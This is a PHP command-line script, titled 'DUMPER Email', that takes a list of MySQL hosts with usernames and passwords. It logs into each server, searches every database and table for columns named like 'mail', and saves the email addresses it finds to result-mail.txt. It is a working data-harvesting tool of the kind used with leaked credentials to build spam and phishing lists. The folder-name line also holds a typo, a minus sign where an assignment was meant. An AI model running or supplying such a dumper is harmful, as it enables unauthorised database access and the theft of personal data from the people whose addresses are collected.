<?php
error_reporting(0);
echo "
	DUMPER Email
";
$list 			= readline("Input List? ");
$buatFolder		= readline("Make Folder? Yes/No ");

if ($buatFolder == "Yes" or $buatFolder == "Y" or $buatFolder == "Ya") {
	$namaFolder - readline("Folder Name? ");
	$makeFolder = mkdir($namaFolder);

	if (!$makeFolder) {
		echo "[System] Failed Make Dir\n";
		exit;
	}
}

if (!is_file($list)) {
	echo "[System] List not Found!\n";
	exit;
}

$getList = explode("\n", file_get_contents($list));

if (count($getList) > 0) {
	foreach ($getList as $key) {
		$q = explode("|", $key);
		list($host,$db,$user,$pass) = $q;

		$conn = mysqli_connect($host, $user, $pass);

		if($conn){
			$q1  = mysqli_query($conn, "SHOW DATABASES");
			echo "[System] Success Login.\n";
			$cdb = 1;
			while ($database = mysqli_fetch_array($q1)) {
			    $q2  = mysqli_query($conn, "SHOW TABLES FROM ".$database['Database']);
			    // $ctb = 1;
			    while ($table  = mysqli_fetch_array($q2)) {
			        $q3 = mysqli_query($conn, "SHOW COLUMNS FROM ".$database['Database'].".".$table["Tables_in_".$database['Database']]." IN ". $database['Database']);
			        while ($columns = mysqli_fetch_array($q3)) {
			            if(preg_match("/email/", $columns['Field']) or preg_match("/mail/", $columns['Field'])){

			                $final_query = mysqli_query($conn, "SELECT ".$columns["Field"]." FROM ".$database['Database'].".".$table['Tables_in_'.$database['Database']]);
			                $cmml = 1;
			                while ($email = mysqli_fetch_array($final_query)) {
			                    if (strstr($email[$columns['Field']], "@")) {
			                        echo "[Info] Retrieve ".$email[$columns['Field']]."\n";
			                        $file = "result-mail.txt";
			                        $f = @fopen($file, "a");
			                        @fwrite($f, $email[$columns['Field']]."\n");
			                        @fclose($f);
			                        $cmml++;
			                    }
			                }

			            }
			        }
			        // $ctb++;
			    }
			    $cdb++;
			} 
			echo "[Info] Count Database {$cdb}\n";
			echo "[Info] Count Retrieve Email {$cmml}\n";
		} else {
			echo "[System] Failed Connect to {$host}\n";
		}
	}
}
